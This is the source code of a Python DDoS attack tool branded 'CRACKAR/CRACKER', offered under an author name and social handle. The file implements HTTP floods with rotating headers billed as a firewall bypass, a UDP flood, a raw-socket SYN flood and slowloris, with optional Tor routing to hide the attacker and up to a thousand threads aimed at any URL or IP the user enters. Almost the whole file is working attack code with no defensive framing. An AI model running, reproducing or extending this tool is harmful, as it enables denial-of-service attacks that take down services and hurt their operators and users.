#!/usr/bin/env python3
import os
import sys
import time
import signal
import random
import threading
import socket
import urllib.parse
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
import colorama
import socks
import struct
import ssl

urllib3.disable_warnings(InsecureRequestWarning)
colorama.init(autoreset=True)
console = Console(force_terminal=True)

ATTACKING = False
STATS = {'req': 0, 'success': 0, 'block': 0, 'error': 0, 'rps': 0, 'bytes': 0}
LOCK = threading.Lock()
START_TIME = 0
LAST_COUNT = 0
TARGET = ""
PROTOCOL, HOST, PORT, PATH = "", "", 80, "/"
MAX_THREADS = 1000
MAX_RPS = 5000
ATTACK_MODE = "http"
TOR_AVAILABLE = False

BYPASS_HEADERS = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Accept': '*/*',
        'Accept-Language': 'en-US',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
]

ATTACK_PATHS = ['/', '/index.php', '/wp-admin/', '/admin/', '/login', '/api/', '/wp-login.php', 
                '/administrator/', '/user', '/dashboard', '/xmlrpc.php', '/wp-json/', '/.env', '/config']

def check_tor():
    global TOR_AVAILABLE
    try:
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        sock.settimeout(5)
        sock.connect(("check.torproject.org", 80))
        sock.close()
        TOR_AVAILABLE = True
        return True
    except:
        TOR_AVAILABLE = False
        return False

def parse_target(target):
    global PROTOCOL, HOST, PORT, PATH
    parsed = urllib.parse.urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
    PROTOCOL = parsed.scheme
    HOST = parsed.hostname
    PORT = parsed.port or (443 if PROTOCOL == 'https' else 80)
    PATH = parsed.path or '/'

def cracker_banner():
    WIDTH = 70

    def line(content="", style="bold red"):
        padded = content.ljust(WIDTH)
        banner.append(f"║{padded}║\n", style=style)

    banner = Text()

    banner.append("\n", style="bold red")
    banner.append("╔" + "═" * WIDTH + "╗\n", style="bold red")

    line()
    banner.append(f"║{' ' * WIDTH}║\n", style="bold red")
    line()

    line("   ██████╗ ██████╗  █████╗  ██████╗ ██╗  ██╗ █████╗ ██████╗")
    line("  ██╔════╝ ██╔══██╗██╔══██╗██╔════╝ ██║ ██╔╝██╔══██╗██╔══██╗")
    line("  ██║      ██████╔╝███████║██║      █████╔╝ ███████║██████╔╝")
    line("  ██║      ██╔══██╗██╔══██║██║      ██╔═██╗ ██╔══██║██╔══██╗")
    line("  ╚██████╗ ██║  ██║██║  ██║╚██████╗ ██║  ██╗██║  ██║██║  ██║")
    line("   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝")

    line()
    banner.append("╚" + "═" * WIDTH + "╝\n", style="bold red")

    banner.append("      CRACKAR v5.0.0.1 | Instagram: arcane.__01 | DDos Attack Tool\n", style="bold green")
    banner.append("                              Author: Alexxx\n", style="bold cyan")

    console.print(banner)

class MultiVectorWorker:
    def __init__(self):
        self.session = None
        self.last_req = 0
        self.sock = None
        self.success_count = 0
        self.error_count = 0
    
    def create_session(self):
        try:
            session = requests.Session()
            adapter = HTTPAdapter(pool_connections=100, pool_maxsize=200, max_retries=1)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            if TOR_AVAILABLE:
                session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
            session.headers.update(random.choice(BYPASS_HEADERS))
            return session
        except:
            return None
    
    def create_raw_socket(self):
        try:
            if PROTOCOL == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=HOST)
            else:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((HOST, PORT))
            return True
        except:
            return False
    
    def waf_bypass_payload(self):
        payloads = [
            PATH or '/',
            f"{PATH or '/'}?id={random.randint(1,999999)}",
            f"{PATH or '/'}index.php",
            f"{PATH or '/'}?page={random.randint(1,999)}",
            f"{PATH or '/'}home",
            f"{PATH or '/'}?user={random.randint(1000,9999)}",
        ]
        return random.choice(payloads)
    
    def rate_limit(self):
        now = time.time()
        if MAX_RPS > 0:
            delay = 1.0 / MAX_RPS
            if now - self.last_req < delay:
                time.sleep(delay - (now - self.last_req))
        self.last_req = time.time()
    
    def http_attack(self):
        try:
            self.rate_limit()
            if not self.session or random.random() < 0.05:
                self.session = self.create_session()
                if not self.session:
                    return 'error'
            
            path = self.waf_bypass_payload()
            port_str = f":{PORT}" if PORT not in (80, 443) else ""
            url = f"{PROTOCOL}://{HOST}{port_str}{path}"
            
            resp = self.session.get(url, timeout=8, verify=False, allow_redirects=True)
            STATS['bytes'] += len(resp.content) + len(resp.request.body or b'')
            
            if 200 <= resp.status_code < 400:
                self.success_count += 1
                return 'success'
            elif resp.status_code in [403, 429, 444, 502, 503, 520]:
                return 'block'
            else:
                return 'success'
        except:
            self.error_count += 1
            return 'error'
    
    def udp_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            payload = random._urandom(1400)
            sent = 0
            for _ in range(5):
                sock.sendto(payload, (HOST, PORT))
                sent += 1400
            STATS['bytes'] += sent
            sock.close()
            return 'success'
        except:
            return 'error'
    
    def syn_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.settimeout(1)
            
            ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 64, socket.IPPROTO_TCP, 0, 0, b'\x00'*4, socket.inet_aton(HOST))
            source_port = random.randint(1024, 65535)
            tcp_header = struct.pack('!HHLLBBHHH', source_port, 80, 0, 0, 0x02, 0xFF, 1024, 0, 0)
            
            sock.sendto(ip_header + tcp_header, (HOST, 0))
            STATS['bytes'] += 52
            return 'success'
        except:
            return 'error'
    
    def slowloris_attack(self):
        try:
            if not self.sock or not self.sock.fileno():
                if not self.create_raw_socket():
                    return 'error'
            
            req = f"GET {self.waf_bypass_payload()} HTTP/1.1\r\n"
            req += f"Host: {HOST}\r\n"
            req += f"User-Agent: {random.choice(BYPASS_HEADERS)['User-Agent']}\r\n"
            req += "Accept: */*\r\n"
            req += "Connection: keep-alive\r\n"
            
            self.sock.send(req.encode())
            STATS['bytes'] += len(req)
            return 'success'
        except:
            try:
                self.sock.close()
            except:
                pass
            return 'error'
    
    def attack(self):
        if ATTACK_MODE == "multi":
            method = random.choices(['http', 'udp', 'slowloris'], weights=[70, 15, 15])[0]
        else:
            method = ATTACK_MODE
        
        if method == 'http':
            return self.http_attack()
        elif method == 'udp':
            return self.udp_attack()
        elif method == 'syn':
            return self.syn_attack()
        elif method == 'slowloris':
            return self.slowloris_attack()
        return 'error'
    
    def run(self):
        global ATTACKING
        while ATTACKING:
            result = self.attack()
            with LOCK:
                STATS['req'] += 1
                if result == 'success':
                    STATS['success'] += 1
                elif result == 'block':
                    STATS['block'] += 1
                else:
                    STATS['error'] += 1

def stats_display():
    global LAST_COUNT
    with Live(refresh_per_second=4) as live:
        while ATTACKING:
            time.sleep(0.25)
            with LOCK:
                total = STATS['req']
                elapsed = time.time() - START_TIME
                rps = (total - LAST_COUNT) / 0.25 if elapsed > 0 else 0
                LAST_COUNT = total
                STATS['rps'] = max(STATS['rps'], rps)
                mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            success_rate = (STATS['success'] / max(total, 1)) * 100
            
            table = Table(title=f"CRACKER v5.0.0.1 | {ATTACK_MODE.upper()} MODE | LIVE STATS", 
                         box=box.DOUBLE_EDGE, title_style="bold magenta on black", 
                         show_header=True, header_style="bold cyan")
            table.add_column("Metric", style="cyan", width=20, no_wrap=True)
            table.add_column("Value", style="bold magenta", width=16)
            table.add_column("Status", style="green", width=24)
            
            table.add_row("LIVE RPS", f"{int(rps):,}", f"LIMIT [{MAX_RPS:,}]")
            table.add_row("LIVE MBPS", f"{mbps:.1f}", "")
            table.add_row("TOTAL REQ", f"{total:,}", "")
            table.add_row("SUCCESS", f"{STATS['success']:,}", f"{success_rate:.1f}%")
            table.add_row("BLOCKED", f"{STATS['block']:,}", "")
            table.add_row("ERRORS", f"{STATS['error']:,}", "")
            table.add_row("BYTES SENT", f"{STATS['bytes']/1024/1024:.1f}MB", "")
            table.add_row("UPTIME", f"{int(elapsed)}s", f"PEAK: {int(STATS['rps']):,}")
            table.add_row("TOR", "ONLINE" if TOR_AVAILABLE else "DIRECT", "")
            table.add_row("TARGET", f"{PROTOCOL}://{HOST}:{PORT}", f"MODE: {ATTACK_MODE}")
            
            live.update(table)

def signal_handler(sig, frame):
    global ATTACKING
    ATTACKING = False
    time.sleep(2)
    final_report()
    sys.exit(0)

def final_report():
    total = STATS['req']
    elapsed = time.time() - START_TIME
    success_rate = (STATS['success'] / max(total, 1)) * 100
    avg_rps = total / elapsed if elapsed > 0 else 0
    mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
    
    console.print(Panel.fit(
        Text.assemble(
            ("TARGET: ", "bold cyan"), (f"{PROTOCOL}://{HOST}:{PORT}{PATH}", "bold white"),
            ("\nTOTAL REQUESTS: ", "bold cyan"), (f"{total:,}", "bold green"),
            ("\nAVG RPS: ", "bold cyan"), (f"{int(avg_rps):,}", "bold yellow"),
            ("\nAVG MBPS: ", "bold cyan"), (f"{mbps:.1f}", "bold yellow"),
            ("\nSUCCESS RATE: ", "bold cyan"), (f"{success_rate:.1f}%", "bold green"),
            ("\nTOR STATUS: ", "bold cyan"), (("ONLINE", "bold green") if TOR_AVAILABLE else ("OFFLINE", "bold red")),
            ("\nTOTAL BYTES: ", "bold cyan"), (f"{STATS['bytes']/1024/1024:.1f}MB", "bold magenta")
        ),
        title=f"ATTACK COMPLETE", border_style="bold green", padding=(1, 2)
    ))

def show_attack_modes():
    modes = {
        "1": "http - Application Layer (Default)",
        "2": "udp - Volumetric UDP Flood", 
        "3": "syn - SYN Flood (Protocol)",
        "4": "slowloris - APDoS Slowloris",
        "5": "multi - Multi-Vector (All Methods)"
    }
    
    console.print(Panel.fit(
        Text.assemble(*[
            (f"{k}: {v}\n", "white") for k,v in modes.items()
        ]),
        title="SELECT ATTACK MODE", border_style="bold yellow", padding=(1, 2)
    ))

def main():
    global TARGET, ATTACKING, START_TIME, MAX_THREADS, MAX_RPS, ATTACK_MODE
    
    os.system('clear' if os.name == 'posix' else 'cls')
    cracker_banner()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\n[TOR DETECTION] 127.0.0.1:9050")
    tor_status = "CONNECTED" if check_tor() else "DIRECT MODE"
    print(f"{tor_status}")
    
    show_attack_modes()
    mode_input = input("\nSELECT MODE [1-5]: ").strip()
    ATTACK_MODE = {"1": "http", "2": "udp", "3": "syn", "4": "slowloris", "5": "multi"}.get(mode_input, "http")
    print(f"ATTACK MODE: {ATTACK_MODE.upper()}")
    
    print("\n[ULTIMATE POWER CONFIG]")
    print("Threads [1000]: ", end="")
    sys.stdout.flush()
    threads_input = input().strip()
    MAX_THREADS = int(threads_input) if threads_input.isdigit() else 1000
    
    print("RPS [5000]: ", end="")
    sys.stdout.flush()
    rps_input = input().strip()
    MAX_RPS = int(rps_input) if rps_input.isdigit() else 5000
    
    print(f"\nCONFIG: {MAX_THREADS:,} THREADS @ {MAX_RPS:,} RPS [{ATTACK_MODE.upper()}]")
    print("WAF BYPASS: ENABLED | MULTI-VECTOR: ACTIVE")
    
    TARGET = input("\nTARGET URL/IP: ").strip()
    if not TARGET:
        print("TARGET REQUIRED")
        return
    
    parse_target(TARGET)
    print(f"\nTARGET LOCKED: {PROTOCOL.upper()}://{HOST}:{PORT}{PATH}")
    
    input("\n[PRESS ENTER TO LAUNCH ATTACK]")
    
    ATTACKING = True
    START_TIME = time.time()
    
    stats_t = threading.Thread(target=stats_display, daemon=True)
    stats_t.start()
    time.sleep(1)
    
    for i in range(MAX_THREADS):
        worker = MultiVectorWorker()
        t = threading.Thread(target=worker.run, daemon=True)
        t.start()
        if i % 200 == 0:
            time.sleep(0.005)
    
    try:
        while ATTACKING:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()
